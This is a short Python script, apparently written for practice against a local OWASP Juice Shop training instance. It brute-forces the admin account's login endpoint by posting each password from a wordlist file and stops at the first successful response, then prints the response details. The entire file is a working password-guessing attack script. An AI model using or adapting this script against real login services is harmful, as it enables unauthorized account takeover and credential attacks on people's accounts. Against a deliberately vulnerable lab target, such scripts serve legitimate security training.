import requests
from requests.structures import CaseInsensitiveDict

url = "http://127.0.0.1:3000/rest/user/login"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/json"






file_path = 'fourni/best1050.txt'

with open(file_path, 'r') as file:
    file_content = ''
    line = file.readline()
    
    while line:
        line = file.readline()

        data = '{"email": "admin@juice-sh.op", "password": "' + line.strip() +'"}'
        print(line) 
        print(data)
        r = requests.post(url, headers=headers, data=data, timeout=10)
        if r.status_code == 200:
            print("Success with password:", line.strip())
            break

# Basic
print(r.status_code)
print(r.text)

# JSON body (if response is JSON)
try:
    print(r.json())
except ValueError:
    print("Response not JSON")

# Full debug: headers and raw bytes
print("Response headers:", r.headers)
print("Raw bytes:", r.content)
